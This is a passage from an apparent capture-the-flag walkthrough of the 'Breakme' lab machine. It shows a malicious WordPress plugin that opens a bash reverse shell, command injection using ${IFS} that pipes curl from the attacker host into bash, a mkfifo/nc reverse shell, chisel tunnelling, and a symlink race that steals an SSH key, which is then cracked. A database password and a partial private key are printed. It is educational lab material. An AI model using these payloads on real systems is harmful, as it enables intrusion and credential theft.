</span></span></span><span class=line><span class=cl><span class=s2>* Description: RevShell Plugin
</span></span></span><span class=line><span class=cl><span class=s2>* Version: 2.0
</span></span></span><span class=line><span class=cl><span class=s2>* Author: CyberJagadeesh
</span></span></span><span class=line><span class=cl><span class=s2>*/
</span></span></span><span class=line><span class=cl><span class=s2>exec(\&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span class=nv>$attacker_ip</span><span class=s2>/4444 0&gt;&amp;1&#39;\&#34;);
</span></span></span><span class=line><span class=cl><span class=s2>?&gt;&#34;</span> &gt; shell.php
</span></span><span class=line><span class=cl>zip -r malicious.zip shell.php
</span></span><span class=line><span class=cl>nc -nvlp <span class=m>4444</span>
</span></span></code></pre></div><p>Modified version of <code>Sevenlayers:PHP plugin</code>.</p><p><figure><img src=/posts/breakme/13.png title="Upload Plugin" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Upload Plugin</strong></figcaption></figure>Lets add new plugin in WP. Click on upload plugin, select and install the plugin.</p><p><figure><img src=/posts/breakme/14.png title="Activate Plugin" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Activate Plugin</strong></figcaption></figure>Activate the plugin to get the reverse shell. (Note: Make sure to have the NetCat listener ready. We will get the reverse shell after a minute of activatting the plugin.)</p><p>Got reverse shell here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>^Z <span class=c1>#(Ctrl+Z)</span>
</span></span><span class=line><span class=cl>stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Got stable shell by running above commands.</p><h2 id=shell-as-john>Shell as John</h2><p>lets use <a href=https://linpeas.sh/ target=_blank rel=noopener>linpeas.sh</a>
for getting privilege escalation vector.</p><pre tabindex=0><code>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Users with console
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash                                                                                                     
root:x:0:0:root:/root:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Active Ports
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                            
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3436 Aug  9  2023 /var/www/html/wordpress/wp-config.php
define( &#39;DB_NAME&#39;, &#39;wpdatabase&#39; );
define( &#39;DB_USER&#39;, &#39;econor&#39; );
define( &#39;DB_PASSWORD&#39;, &#39;SuP3rS3cR37#DB#P@55wd&#39; );
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
define(&#39;WP_HOME&#39;,&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].&#39;/wordpress/&#39;);
define(&#39;WP_SITEURL&#39;,&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].&#39;/wordpress/&#39;);
</code></pre><p>From <code>linpeas.sh</code> we found some useful information:</p><ol><li>3 users in system - <code>john</code>, <code>youcef</code> and <code>root</code>.</li><li>Other than port 80 and 22, we have 2 more ports open that is <code>port 3306</code> and <code>port 9999</code> in the system&rsquo;s local host.</li><li>We got a database credentials from <code>/var/www/html/wordpress/wp-config.php</code>, where<ul><li>DB_NAME = <code>wpdatabase</code></li><li>DB_USER = <code>econor</code></li><li>DB_PASSWORD = <code>SuP3rS3cR37#DB#P@55wd</code></li><li>DB_HOST = <code>localhost</code></li></ul></li></ol><h3 id=pspy64>pspy64</h3><p>Using <a href=https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 target=_blank rel=noopener>pspy64</a>
for getting running processes.</p><pre tabindex=0><code>CMD: UID=1002  PID=537    | /usr/bin/php -S 127.0.0.1:9999 
</code></pre><p>Have an interesting result.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Breakme:$ id <span class=m>1002</span>
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>john<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>john<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>john<span class=o>)</span>
</span></span></code></pre></div><p>We can see that <code>port 9999</code> is active using <code>pspy64</code> binary and it is triggered by user <code>john</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Breakme:$ curl http://127.0.0.1:9999/
</span></span></code></pre></div><p>The above command gives us a content of a web page, means a <code>web server</code> is running in localhost of <code>port 9999</code>. And <code>port 3306</code> is for <code>mysql server</code>.</p><p>Lets port forward to make the process simple.</p><h3 id=chisel-tunneling>Chisel tunneling</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
</span></span><span class=line><span class=cl>gzip -d chisel_1.10.0_linux_amd64.gz
</span></span><span class=line><span class=cl>mv chisel_1.10.0_linux_amd64 chisel
</span></span><span class=line><span class=cl>./chisel server --reverse --port <span class=m>8000</span>
</span></span></code></pre></div><p>This command starts a Chisel server in reverse mode on port 8000 in attacker machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># in target machine</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> /tmp
</span></span><span class=line><span class=cl>wget http://10.10.1.62/chisel
</span></span><span class=line><span class=cl>chmod +x chisel
</span></span><span class=line><span class=cl>./chisel client 10.10.1.62:8000 R:8080:127.0.0.1:9999
</span></span></code></pre></div><p>This command sets up a client using the Chisel tool to tunnel traffic from port 8080 on a remote server at IP address 10.10.1.62 to port 9999 on the local machine through a reverse tunnel.</p><p>Now we can access port 9999.</p><h3 id=connecting-localhost9999>Connecting localhost:9999</h3><figure><img src=/posts/breakme/15.png title="target- localhost:9999" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>target- localhost:9999</strong></figcaption></figure><p>Here we have 3 functionality to check the <code>IP</code>, <code>User</code> and <code>File</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ tcpdump -i tun0 icmp                                                                                                                                     
</span></span><span class=line><span class=cl>tcpdump: verbose output suppressed, use -v<span class=o>[</span>v<span class=o>]</span>... <span class=k>for</span> full protocol decode
</span></span><span class=line><span class=cl>listening on tun0, link-type RAW <span class=o>(</span>Raw IP<span class=o>)</span>, snapshot length <span class=m>262144</span> bytes
</span></span><span class=line><span class=cl>15:29:02.694087 IP breakme.thm &gt; attacker_ip: ICMP <span class=nb>echo</span> request, id 16534, seq 1, length <span class=m>64</span>
</span></span><span class=line><span class=cl>15:29:02.694148 IP attacker_ip &gt; breakme.thm: ICMP <span class=nb>echo</span> reply, id 16534, seq 1, length <span class=m>64</span>
</span></span><span class=line><span class=cl>15:29:03.686421 IP breakme.thm &gt; attacker_ip: ICMP <span class=nb>echo</span> request, id 16534, seq 2, length <span class=m>64</span>
</span></span><span class=line><span class=cl>15:29:03.686442 IP attacker_ip &gt; breakme.thm: ICMP <span class=nb>echo</span> reply, id 16534, seq 2, length <span class=m>64</span>
</span></span></code></pre></div><p>If we gave the valid IPv4 address the system is making ping(ICMP) requests.</p><p>Note: No visible response found in the page.</p><pre tabindex=0><code>CMD: UID=1002  PID=2195   | sh -c ping -c 2 10.10.10.10 &gt;/dev/null 2&gt;&amp;1 &amp;
</code></pre><p>Result from <code>pspy64</code> when checking for IP.</p><p><figure><img src=/posts/breakme/16.png title="Check User: john" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Check User: john</strong></figcaption></figure>If incorrect username was entered we are getting response as <em>User <code>name</code> not found</em>. Here we are getting visible result.</p><pre tabindex=0><code>CMD: UID=1002  PID=2199   | sh -c id john &gt;/dev/null 2&gt;&amp;1 &amp;
</code></pre><p>Result from <code>pspy64</code> when checking for USER.</p><p><figure><img src=/posts/breakme/17.png title="Check File: Passwords.txt" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Check File: Passwords.txt</strong></figcaption></figure>If filename with extension was entered we are getting response as <em>Invalid Filename</em> and if a filename like <code>Passwords</code> was given we are getting result as <em>File not found</em>.</p><pre tabindex=0><code>CMD: UID=1002  PID=2214   | sh -c find /opt -name &#34;Passwords&#34; 2&gt;/dev/null
</code></pre><p>Result from <code>pspy64</code> when checking for File.</p><p>In these 3 functionality <code>Check User</code> functionality is interesting as it&rsquo;s <code>reflecting the username</code> entered in response.</p><h3 id=special-character-bypass>Special Character ByPass</h3><figure><img src=/posts/breakme/18.png title="Check User: <special characters>" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Check User: &lt;special characters></strong></figcaption></figure><p>While entering all the special characters <code>~ ! @ # $ % ^ & * ( ) _ + { } | : " &lt; > ? ` - = [ ] \ ; ' , . /</code> in user check functionality, we are getting <em>User <code>${}|:./</code> not found</em>.</p><pre tabindex=0><code>CMD: UID=1002  PID=2216   | sh -c id ${}|:./ &gt;/dev/null 2&gt;&amp;1 &amp; 
</code></pre><p>Result from <code>pspy64</code> when checking for <code>~ ! @ # $ % ^ & * ( ) _ + { } | : " &lt; > ? ` - = [ ] \ ; ' , . /</code></p><p>It means that there is some filtering happening in backend before precessing the given input. Note: <code>SPACE</code> also being filtered here. Characters which are not filtered were <code>$ { } | : . /</code></p><p>We need to bypass this filtering to get reverse <code>shell as user John</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=s1>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.1.62 1234 &gt;/tmp/f&#39;</span> &gt; revshell.sh
</span></span><span class=line><span class=cl>python -m http.server <span class=m>80</span>
</span></span></code></pre></div><p>Creating an reverse shell payload in attacker system.</p><h3 id=input_field_separators-ifs>Input_Field_Separators ${IFS}</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>|</span>curl<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>http://10.10.1.62/revshell.sh<span class=p>|</span>bash
</span></span></code></pre></div><p>The above payload for <code>Check User</code> gives us reverse shell as user John.</p><p>Here <a href=https://en.wikipedia.org/wiki/Input_Field_Separators target=_blank rel=noopener><code>${IFS}</code></a>
will be act as <code>SPACE</code> character in UNIX.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> Hello<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>World
</span></span><span class=line><span class=cl>Hello World
</span></span></code></pre></div><p>Example usage of ${IFS}.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>^Z <span class=c1>#(Ctrl+Z)</span>
</span></span><span class=line><span class=cl>stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><p>Got stable shell by running above commands.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john@Breakme:~$ cat user1.txt 
</span></span><span class=line><span class=cl>Flag1 REDACTED
</span></span></code></pre></div><p>We got our first flag here.</p><h2 id=shell-as-youcef>Shell as Youcef</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john@Breakme:/home/youcef$ ls -lah
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> youcef youcef 3.5K Aug  <span class=m>1</span>  <span class=m>2023</span> .bashrc
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> youcef youcef 4.0K Aug  <span class=m>1</span>  <span class=m>2023</span> .local
</span></span><span class=line><span class=cl>-rwsr-sr-x <span class=m>1</span> youcef youcef  17K Aug  <span class=m>2</span>  <span class=m>2023</span> readfile
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> youcef youcef 1.1K Aug  <span class=m>2</span>  <span class=m>2023</span> readfile.c
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> youcef youcef 4.0K Aug  <span class=m>5</span>  <span class=m>2023</span> .ssh
</span></span></code></pre></div><p>Here we have an interesting binary <code>readfile</code> with <code>SUID bit</code>, which will execute as user <code>youcef</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john@Breakme:/home/youcef$ ./readfile readfile.c 
</span></span><span class=line><span class=cl>Nice try!
</span></span></code></pre></div><p>We are not able to read the contents of file <code>readfile.c</code>, might be using conditional statements in the binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john@Breakme:/home/youcef$ <span class=nb>echo</span> Hello &gt; /tmp/abc.c
</span></span><span class=line><span class=cl>john@Breakme:/home/youcef$ ./readfile /tmp/abc.c 
</span></span><span class=line><span class=cl>I guess you won!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hello
</span></span></code></pre></div><p>If we read a file, getting success message <code>I guess you won!</code>.</p><h3 id=race-condition>Race Condition</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>stat</span> <span class=n>lstat_buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Check if the correct number of arguments is provided
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Usage: ./readfile &lt;FILE&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Check if the file exists and is accessible
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nf>access</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>F_OK</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;File Not Found&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Check if the user ID is 0x3ea(1002) john
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nf>getuid</span><span class=p>()</span><span class=o>!=</span><span class=mi>1002</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You can&#39;t run this program&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Check if the file name contains &#34;flag&#34; or &#34;id_rsa&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>flag</span> <span class=o>=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>id_rsa</span> <span class=o>=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;id_rsa&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get the file status information
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>lstat</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>lstat_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// checks if the supplied file is a SYMLINK
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>symlink_check</span> <span class=o>=</span> <span class=p>(</span><span class=nf>S_ISLNK</span><span class=p>(</span><span class=n>lstat_buf</span><span class=p>.</span><span class=n>st_mode</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=c1>// checks if the user john can read the supplied file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>res</span><span class=o>=</span><span class=nf>access</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=n>R_OK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// will cause a delay
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>usleep</span><span class=p>(</span><span class=mf>0.8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// if it does not include &#34;flag&#34; or &#34;id_rsa&#34; or &#34;symlink&#34; or &#34;readable&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>flag</span> <span class=o>||</span> <span class=n>symlink_check</span> <span class=o>||</span> <span class=n>res</span><span class=o>==-</span><span class=mi>1</span> <span class=o>||</span> <span class=n>id_rsa</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Nice try!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I guess you won!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// open the file for reading
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// read and print the file in chunks of 1024 bytes
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>assert</span><span class=p>(</span><span class=n>fd</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=s>&#34;Failed to open the file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>((</span><span class=n>n</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>1024</span><span class=p>))</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We have decompiled the binary <code>readme</code> using <code>Ghidhra</code>.</p><p>The <code>readfile</code> application exhibits a <code>race condition</code> vulnerability due to the delay introduced by <code>usleep</code> between checking a file&rsquo;s validity and accessing its contents. This delay allows for a potential race condition where a malicious actor could modify the file&rsquo;s contents or permissions during this time, leading to unauthorized access or execution of malicious code.</p><p>Resources to go through: <a href=https://www.geeksforgeeks.org/race-condition-vulnerability/ target=_blank rel=noopener>race-condition-vulnerability|geeksforgeeks</a>
, <a href=https://portswigger.net/web-security/race-conditions target=_blank rel=noopener>race-conditions|portswigger</a>
.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /home/john
</span></span><span class=line><span class=cl><span class=k>for</span> i in <span class=o>{</span>1..1000<span class=o>}</span><span class=p>;</span> <span class=k>do</span> ln -sf /home/youcef/.ssh/id_rsa ourFile<span class=p>;</span> rm ourFile<span class=p>;</span> touch ourFile<span class=p>;</span> <span class=k>done</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> i in <span class=o>{</span>1..100<span class=o>}</span><span class=p>;</span> <span class=k>do</span> /home/youcef/./readfile ourFile <span class=p>|</span> grep -v <span class=s2>&#34;File Not Found&#34;</span> <span class=p>|</span> grep -v <span class=s2>&#34;I guess you won!&#34;</span><span class=p>;</span> <span class=k>done</span>
</span></span></code></pre></div><p>The Bash script exploits a race condition in the <code>readfile</code> binary by rapidly creating and deleting symlinks to a sensitive file while the application attempts to access it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
</span></span><span class=line><span class=cl>Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
</span></span><span class=line><span class=cl>P5f1aOa67ZDRv6XlKz/0fASHI4XQF3pNBWpA79PPlOxDP3QZfZnIxNIeqy8NXrT23cDQdx
</span></span><span class=line><span class=cl>ZDWnKO1hlrRk1bIzQJnMSFKO9d/fcxJncGXnjgBTNq1nllLHEbf0YUZnUILVfMHszXQvfD
</span></span><span class=line><span class=cl>-------------------------------HIDDEN---------------------------------
</span></span><span class=line><span class=cl>hdliLJt0xG6Cb/23Vkh9rG25475k7kk7rh1ZXDNXuU4Z1DvPgh269FyR2BMJ3UUj2+HQdc
</span></span><span class=line><span class=cl>0LBpVwh96JbHrLASEwx74+CQq71ICdX3Qvv0cJFjMBUmLgFCyaoKlNKntBqHEJ2bI4+qHq
</span></span><span class=line><span class=cl>W5lj7CKPS8r6xN83bz8pWg44bbJaspWajXqgDM0Pb4/ANBgMoxLgAmQUgSLfDOg6FCXGlU
</span></span><span class=line><span class=cl>rkYkHSce+BnIEYBnNK9ttPGRMdElELGBTfBXpBtYoF+9hXOnTD2pVDVewpV7kOqBiusnfM
</span></span><span class=line><span class=cl>yHBxN27qpNoUHbrKHxLx4/UN4z3xcaabtC7BelMsu4RQ3rzGtLS9fhT5e0hoMP+eU3IvMB
</span></span><span class=line><span class=cl>g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
</span></span><span class=line><span class=cl>TabCXd2Ji/Y7UvM<span class=o>=</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>We got the id_rsa ssh key of user youcef. When tried to connect network as user youcef, system requesting for password. We need to crack the password of <code>id_rsa</code> key.</p><h3 id=ssh2john>ssh2john</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh2john id_rsa &gt; id_rsa_hash
</span></span></code></pre></div><p>Getting the decryption hash using <code>ssh2john</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john id_rsa_hash --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>a123456          <span class=o>(</span>id_rsa<span class=o>)</span>     
</span></span></code></pre></div><p>Now we got the password for <code>id_rsa</code> key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>youcef@Breakme:~$ cat /home/youcef/.ssh/user2.txt
</span></span><span class=line><span class=cl>flag2 REDACTED
</span></span></code></pre></div><p>We got our second flag here.</p><h2 id=shell-as-root>Shell as root</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>youcef@Breakme:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>youcef<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>youcef<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>youcef<span class=o>)</span>
</span></span><span class=line><span class=cl>youcef@Breakme:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> youcef on breakme:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User youcef may run the following commands on breakme:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/python3 /root/jail.py
</span></span></code></pre></div><p>We can run <code>/usr/bin/python3 /root/jail.py</code> in the context of root user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>youcef</span><span class=nd>@Breakme</span><span class=p>:</span><span class=o>~</span><span class=err>$</span> <span class=n>sudo</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=nb>bin</span><span class=o>/</span><span class=n>python3</span> <span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>jail</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl>  <span class=n>Welcome</span> <span class=n>to</span> <span class=n>Python</span> <span class=n>jail</span>  
</span></span><span class=line><span class=cl>  <span class=n>Will</span> <span class=n>you</span> <span class=n>stay</span> <span class=n>locked</span> <span class=n>forever</span>  
</span></span><span class=line><span class=cl>  <span class=n>Or</span> <span class=n>will</span> <span class=n>you</span> <span class=n>BreakMe</span>  
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=nb>eval</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>exec</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>
</span></span><span class=line><span class=cl><span class=o>&gt;&gt;</span> <span class=n>test</span> <span class=n>string</span> <span class=c1>#Error due to space</span>
</span></span><span class=line><span class=cl><span class=n>Illegal</span> <span class=n>Input</span>  
